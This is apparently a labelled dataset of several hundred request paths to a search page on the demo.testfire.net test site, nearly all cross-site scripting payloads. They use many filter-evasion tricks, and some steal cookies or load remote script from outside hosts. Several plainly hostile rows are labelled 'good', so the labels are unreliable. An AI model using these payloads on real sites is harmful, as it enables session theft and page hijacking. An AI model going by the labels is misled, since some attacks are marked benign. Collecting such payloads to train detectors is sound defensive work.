path,content,host,class_flag
"/search.jsp?query=<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",,demo.testfire.net,['bad']
"/search.jsp?query=<XSS STYLE=""xss:expression(alert('XSS'))"">",,demo.testfire.net,['bad']
"/search.jsp?query=<XSS STYLE=""behavior: url(xss.htc);"">",,demo.testfire.net,['bad']
"/search.jsp?query=<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",,demo.testfire.net,['bad']
"/search.jsp?query=<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",,demo.testfire.net,['bad']
"/search.jsp?query=<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",,demo.testfire.net,['bad']
"/search.jsp?query=<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",,demo.testfire.net,['bad']
"/search.jsp?query=<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",,demo.testfire.net,['bad']
"/search.jsp?query=<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",,demo.testfire.net,['bad']
"/search.jsp?query=<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",,demo.testfire.net,['bad']
"/search.jsp?query=<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",,demo.testfire.net,['bad']
"/search.jsp?query=<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",,demo.testfire.net,['bad']
"/search.jsp?query=<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",,demo.testfire.net,['bad']
"/search.jsp?query=<TABLE BACKGROUND=""javascript:alert('XSS')"">",,demo.testfire.net,['bad']
"/search.jsp?query=<DIV STYLE=""width: expression(alert('XSS'));"">",,demo.testfire.net,['bad']
"/search.jsp?query=<BASE HREF=""javascript:alert('XSS');//"">",,demo.testfire.net,['bad']
"/search.jsp?query= <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",,demo.testfire.net,['bad']
"/search.jsp?query=<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",,demo.testfire.net,['bad']
"/search.jsp?query=<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",,demo.testfire.net,['bad']
/search.jsp?query=Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,,demo.testfire.net,['good']
"/search.jsp?query=<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",,demo.testfire.net,['bad']
"/search.jsp?query= <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<A HREF=""http://66.102.7.147/"">XSS</A>",,demo.testfire.net,['bad']
"/search.jsp?query=<A HREF=""http://www.google.com"">XSS</A>",,demo.testfire.net,['bad']
"/search.jsp?query=<A HREF=""http://1113982867/"">XSS</A>",,demo.testfire.net,['bad']
"/search.jsp?query=<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",,demo.testfire.net,['bad']
"/search.jsp?query=<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",,demo.testfire.net,['bad']
"/search.jsp?query=<A HREF=""htt p://6 6.000146.0x7.147/"">XSS</A>",,demo.testfire.net,['bad']
"/search.jsp?query=<iframe  src=""&Tab;javascript:prompt(1)&Tab;"">",,demo.testfire.net,['bad']
/search.jsp?query=<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',,demo.testfire.net,['bad']
"/search.jsp?query=<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",,demo.testfire.net,['bad']
/search.jsp?query=<sVg><scRipt >alert&lpar;1&rpar; {Opera},,demo.testfire.net,['bad']
/search.jsp?query=<img/src=`` onerror=this.onerror=confirm(1) ,,demo.testfire.net,['bad']
"/search.jsp?query=<form><isindex formaction=""javascript&colon;confirm(1)""",,demo.testfire.net,['bad']
/search.jsp?query=<img src=``&NewLine; onerror=alert(1)&NewLine;,,demo.testfire.net,['bad']
/search.jsp?query=<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,,demo.testfire.net,['bad']
/search.jsp?query=<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,,demo.testfire.net,['bad']
"/search.jsp?query=<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",,demo.testfire.net,['bad']
/search.jsp?query=<script /**/>/**/alert(1)/**/</script /**/,,demo.testfire.net,['bad']
/search.jsp?query=&#34;&#62;<h1/onmouseover='\u0061lert(1)'>,,demo.testfire.net,['bad']
"/search.jsp?query=<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",,demo.testfire.net,['bad']
"/search.jsp?query=<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",,demo.testfire.net,['bad']
"/search.jsp?query=<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",,demo.testfire.net,['bad']
/search.jsp?query=<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},,demo.testfire.net,['bad']
"/search.jsp?query=<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",,demo.testfire.net,['bad']
/search.jsp?query=<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,,demo.testfire.net,['bad']
"/search.jsp?query=<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",,demo.testfire.net,['bad']
"/search.jsp?query=</script><img/*/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/*/onerror='eval(src)'>",,demo.testfire.net,['bad']
/search.jsp?query=<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,,demo.testfire.net,['bad']
"/search.jsp?query=<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",,demo.testfire.net,['bad']
/search.jsp?query=http://www.google<script .com>alert(document.location)</script,,demo.testfire.net,['bad']
"/search.jsp?query=<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",,demo.testfire.net,['bad']
/search.jsp?query=<img/src=@&#32;&#13; onerror = prompt('&#49;'),,demo.testfire.net,['bad']
/search.jsp?query=<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,,demo.testfire.net,['bad']
/search.jsp?query=<script ^__^>alert(String.fromCharCode(49))</script ^__^,,demo.testfire.net,['bad']
/search.jsp?query=</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,,demo.testfire.net,['bad']
"/search.jsp?query=&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",,demo.testfire.net,['bad']
/search.jsp?query=<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,,demo.testfire.net,['bad']
/search.jsp?query=<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,,demo.testfire.net,['bad']
/search.jsp?query=<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",,demo.testfire.net,['bad']
/search.jsp?query=<script ~~~>alert(0%0)</script ~~~>,,demo.testfire.net,['bad']
/search.jsp?query=<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,,demo.testfire.net,['bad']
/search.jsp?query=<///style///><span / onmousemove='alert&lpar;1&rpar;'>SPAN,,demo.testfire.net,['bad']
/search.jsp?query=<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),,demo.testfire.net,['bad']
/search.jsp?query=&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',,demo.testfire.net,['bad']
/search.jsp?query=&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},,demo.testfire.net,['bad']
/search.jsp?query=<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,,demo.testfire.net,['bad']
"/search.jsp?query=<div/style=""width:expression(confirm(1))"">X</div> {IE7}",,demo.testfire.net,['bad']
/search.jsp?query=<iframe// src=javaSCRIPT&colon;alert(1),,demo.testfire.net,['bad']
/search.jsp?query=//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,,demo.testfire.net,['bad']
"/search.jsp?query=/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",,demo.testfire.net,['bad']
/search.jsp?query=//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,,demo.testfire.net,['bad']
/search.jsp?query=</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,,demo.testfire.net,['bad']
"/search.jsp?query=<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",,demo.testfire.net,['bad']
/search.jsp?query=</plaintext\></|\><plaintext/onmouseover=prompt(1),,demo.testfire.net,['bad']
/search.jsp?query=</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javascript&colon;\u0061&#x6C;&#101rt&lpar;1&rpar;""><button>",,demo.testfire.net,['bad']
/search.jsp?query=<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,,demo.testfire.net,['bad']
"/search.jsp?query=<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",,demo.testfire.net,['bad']
"/search.jsp?query=<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",,demo.testfire.net,['bad']
"/search.jsp?query=<var onmouseover=""prompt(1)"">On Mouse Over</var>",,demo.testfire.net,['bad']
/search.jsp?query=<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,,demo.testfire.net,['bad']
"/search.jsp?query=<img src=""/"" =_="" title=""onerror='prompt(1)'"">",,demo.testfire.net,['bad']
/search.jsp?query=<%<!--'%><script>alert(1);</script -->,,demo.testfire.net,['bad']
"/search.jsp?query=<script src=""data:text/javascript,alert(1)""></script>",,demo.testfire.net,['bad']
/search.jsp?query=<iframe/src \/\/onload = prompt(1),,demo.testfire.net,['bad']
/search.jsp?query=<iframe/onreadystatechange=alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<svg/onload=alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<input value=<><iframe/src=javascript:confirm(1),,demo.testfire.net,['bad']
"/search.jsp?query=<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",,demo.testfire.net,['bad']
/search.jsp?query=<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(&Tab;1&Tab;)></iframe>,,demo.testfire.net,['bad']
/search.jsp?query=<img src=`xx:xx`onerror=alert(1)>,,demo.testfire.net,['bad']
"/search.jsp?query=<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",,demo.testfire.net,['bad']
"/search.jsp?query=<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",,demo.testfire.net,['bad']
"/search.jsp?query=<math><a xlink:href=""//jsfiddle.net/t846h/"">click",,demo.testfire.net,['bad']
"/search.jsp?query=<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",,demo.testfire.net,['bad']
/search.jsp?query=<svg contentScriptType=text/vbs><script>MsgBox+1,,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101rt(1)>"">X</a",,demo.testfire.net,['bad']
/search.jsp?query=<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,,demo.testfire.net,['bad']
/search.jsp?query=<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,,demo.testfire.net,['bad']
"/search.jsp?query=<script/src=""data&colon;text/j\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=/",,demo.testfire.net,['bad']
"/search.jsp?query=<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061lert(/XSS/)></script",,demo.testfire.net,['bad']
/search.jsp?query=<object data=javascript&colon;\u0061&#x6C;&#101rt(1)>,,demo.testfire.net,['bad']
/search.jsp?query=<script>+-+-1-+-+alert(1)</script>,,demo.testfire.net,['bad']
/search.jsp?query=<body/onload=&lt;!--&gt;&#10alert(1)>,,demo.testfire.net,['bad']
/search.jsp?query=<script itworksinallbrowsers>/*<script* */alert(1)</script,,demo.testfire.net,['bad']
/search.jsp?query=<img src ?itworksonchrome?\/onerror = alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<svg><script>//&NewLine;confirm(1);</script </svg>,,demo.testfire.net,['bad']
/search.jsp?query=<svg><script onlypossibleinopera:-)> alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,,demo.testfire.net,['bad']
/search.jsp?query=<script x> alert(1) </script 1=2,,demo.testfire.net,['bad']
"/search.jsp?query=<div/onmouseover='alert(1)'> style=""x:"">",,demo.testfire.net,['bad']
/search.jsp?query=<--`<img/src=` onerror=alert(1)> --!>,,demo.testfire.net,['bad']
"/search.jsp?query=<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",,demo.testfire.net,['bad']
"/search.jsp?query=<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",,demo.testfire.net,['bad']
"/search.jsp?query=""><img src=x onerror=window.open('https://www.google.com/');>",,demo.testfire.net,['bad']
/search.jsp?query=<form><button formaction=javascript&colon;alert(1)>CLICKME,,demo.testfire.net,['bad']
"/search.jsp?query=<math><a xlink:href=""//jsfiddle.net/t846h/"">click",,demo.testfire.net,['bad']
"/search.jsp?query=<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",,demo.testfire.net,['bad']
"/search.jsp?query=<iframe src=""data:text/html,<script>alert(1)</script>""></iframe>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",,demo.testfire.net,['bad']
"/search.jsp?query='';!--""<XSS>=&{()}",,demo.testfire.net,['bad']
"/search.jsp?query='>//\\,<'>"">"">""*""",,demo.testfire.net,['bad']
/search.jsp?query='); alert('XSS,,demo.testfire.net,['bad']
/search.jsp?query=<script>alert(1);</script>,,demo.testfire.net,['bad']
/search.jsp?query=<script>alert('XSS');</script>,,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC=""javascript:alert('XSS');"">",,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=javascript:alert('XSS')>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=javascript:alert('XSS')>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=javascript:alert(&quot;XSS&quot;)>,,demo.testfire.net,['bad']
"/search.jsp?query=<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",,demo.testfire.net,['bad']
/search.jsp?query=<scr<script>ipt>alert('XSS');</scr</script>ipt>,,demo.testfire.net,['bad']
"/search.jsp?query=<script>alert(String.fromCharCode(88,83,83))</script> ",,demo.testfire.net,['bad']
/search.jsp?query=<img src=foo.png onerror=alert(/xssed/) />,,demo.testfire.net,['bad']
"/search.jsp?query=<style>@im\port'\ja\vasc\ript:alert(\""XSS\"")';</style>",,demo.testfire.net,['bad']
"/search.jsp?query=<? echo('<scr)'; echo('ipt>alert(\""XSS\"")</script>'); ?>",,demo.testfire.net,['bad']
/search.jsp?query=<marquee><script>alert('XSS')</script></marquee>,,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC=\""jav&#x09;ascript:alert('XSS');\"">",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC=\""jav&#x0A;ascript:alert('XSS');\"">",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC=\""jav&#x0D;ascript:alert('XSS');\"">",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",,demo.testfire.net,['bad']
"/search.jsp?query=""><script>alert(0)</script>",,demo.testfire.net,['bad']
/search.jsp?query=<script src=http://yoursite.com/your_files.js></script>,,demo.testfire.net,['bad']
/search.jsp?query=</title><script>alert(/xss/)</script>,,demo.testfire.net,['bad']
/search.jsp?query=</textarea><script>alert(/xss/)</script>,,demo.testfire.net,['bad']
"/search.jsp?query=<IMG LOWSRC=\""javascript:alert('XSS')\"">",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG DYNSRC=\""javascript:alert('XSS')\"">",,demo.testfire.net,['bad']
/search.jsp?query=<font style='color:expression(alert(document.cookie))'>,,demo.testfire.net,['bad']
"/search.jsp?query=<img src=""javascript:alert('XSS')"">",,demo.testfire.net,['bad']
"/search.jsp?query=<script language=""JavaScript"">alert('XSS')</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onunload=""javascript:alert('XSS');"">",,demo.testfire.net,['bad']
"/search.jsp?query=<body onLoad=""alert('XSS');""",,demo.testfire.net,['bad']
"/search.jsp?query=[color=red' onmouseover=""alert('xss')""]mouse over[/color]",,demo.testfire.net,['bad']
"/search.jsp?query=""/></a></><img src=1.gif onerror=alert(1)>",,demo.testfire.net,['bad']
"/search.jsp?query=window.alert(""Bonjour !"");",,demo.testfire.net,['bad']
"/search.jsp?query=<div style=""x:expression((window.r==1)?'':eval('r=1;",,demo.testfire.net,['good']
"/search.jsp?query=alert(String.fromCharCode(88,83,83));'))"">",,demo.testfire.net,['bad']
/search.jsp?query=<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>,,demo.testfire.net,['bad']
"/search.jsp?query=""><script alert(String.fromCharCode(88,83,83))</script>",,demo.testfire.net,['bad']
/search.jsp?query='>><marquee><h1>XSS</h1></marquee>,,demo.testfire.net,['bad']
"/search.jsp?query='"">><script>alert('XSS')</script>",,demo.testfire.net,['bad']
"/search.jsp?query='"">><marquee><h1>XSS</h1></marquee>",,demo.testfire.net,['bad']
"/search.jsp?query=<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript:alert('XSS');\"">",,demo.testfire.net,['bad']
"/search.jsp?query=<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http://;URL=javascript:alert('XSS');\"">",,demo.testfire.net,['bad']
/search.jsp?query=<script>var var = 1; alert(var)</script>,,demo.testfire.net,['bad']
"/search.jsp?query=<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",,demo.testfire.net,['bad']
"/search.jsp?query=<?='<SCRIPT>alert(""XSS"")</SCRIPT>'?>",,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC='vbscript:msgbox(\""XSS\"")'>",,demo.testfire.net,['bad']
"/search.jsp?query="" onfocus=alert(document.domain) ""> <""",,demo.testfire.net,['bad']
"/search.jsp?query=<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>",,demo.testfire.net,['bad']
"/search.jsp?query=<STYLE>li {list-style-image: url(\""javascript:alert('XSS')\"");}</STYLE><UL><LI>XSS",,demo.testfire.net,['bad']
"/search.jsp?query=perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",,demo.testfire.net,['bad']
"/search.jsp?query=perl -e 'print \""<IMG SRC=java\0script:alert(\""XSS\"")>\"";' > out",,demo.testfire.net,['bad']
"/search.jsp?query=<br size=\""&{alert('XSS')}\"">",,demo.testfire.net,['bad']
/search.jsp?query=<scrscriptipt>alert(1)</scrscriptipt>,,demo.testfire.net,['bad']
/search.jsp?query=</br style=a:expression(alert())>,,demo.testfire.net,['bad']
/search.jsp?query=</script><script>alert(1)</script>,,demo.testfire.net,['bad']
"/search.jsp?query=""><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",,demo.testfire.net,['bad']
/search.jsp?query=[color=red width=expression(alert(123))][color],,demo.testfire.net,['bad']
"/search.jsp?query=<BASE HREF=""javascript:alert('XSS');//"">",,demo.testfire.net,['bad']
/search.jsp?query=Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,,demo.testfire.net,['good']
"/search.jsp?query=""></iframe><script>alert(123)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<body onLoad=""while(true) alert('XSS');"">",,demo.testfire.net,['bad']
"/search.jsp?query='""></title><script>alert(1111)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=</textarea>'""><script>alert(document.cookie)</script>",,demo.testfire.net,['bad']
"/search.jsp?query='""""><script language=""JavaScript""> alert('X \nS \nS');</script>",,demo.testfire.net,['bad']
/search.jsp?query=</script></script><<<<script><>>>><<<script>alert(123)</script>,,demo.testfire.net,['bad']
/search.jsp?query=<html><noalert><noscript>(123)</noscript><script>(123)</script>,,demo.testfire.net,['bad']
"/search.jsp?query=<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",,demo.testfire.net,['bad']
"/search.jsp?query='>""><script src = 'http://www.site.com/XSS.js'></script>",,demo.testfire.net,['bad']
/search.jsp?query='></select><script>alert(123)</script>,,demo.testfire.net,['bad']
/search.jsp?query=}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>,,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT>document.write(""XSS"");</SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=a=""get"";b=""URL"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",,demo.testfire.net,['bad']
"/search.jsp?query=='><script>alert(""xss"")</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script+src="">""+src=""http://yoursite.com/xss.js?69,69""></script>",,demo.testfire.net,['bad']
"/search.jsp?query=<body background=javascript:'""><script>alert(navigator.userAgent)</script>></body>",,demo.testfire.net,['bad']
"/search.jsp?query="">/XaDoS/><script>alert(document.cookie)</script><script src=""http://www.site.com/XSS.js""></script>",,demo.testfire.net,['bad']
"/search.jsp?query="">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>",,demo.testfire.net,['bad']
"/search.jsp?query=src=""http://www.site.com/XSS.js""></script>",,demo.testfire.net,['bad']
"/search.jsp?query=data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=",,demo.testfire.net,['good']
"/search.jsp?query=!--"" /><script>alert('xss');</script>",,demo.testfire.net,['bad']
"/search.jsp?query=<script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",,demo.testfire.net,['bad']
"/search.jsp?query=""><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",,demo.testfire.net,['bad']
"/search.jsp?query='""></title><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",,demo.testfire.net,['bad']
"/search.jsp?query=<img """"""><script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",,demo.testfire.net,['bad']
/search.jsp?query=<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>,,demo.testfire.net,['bad']
"/search.jsp?query=""><script>alert(1337)</script>""><script>alert(""XSS by \nxss</h1></marquee>",,demo.testfire.net,['bad']
"/search.jsp?query='""></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>",,demo.testfire.net,['bad']
"/search.jsp?query=<iframe src=""javascript:alert('XSS by \nxss');""></iframe><marquee><h1>XSS by xss</h1></marquee>",,demo.testfire.net,['bad']
"/search.jsp?query='><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",,demo.testfire.net,['bad']
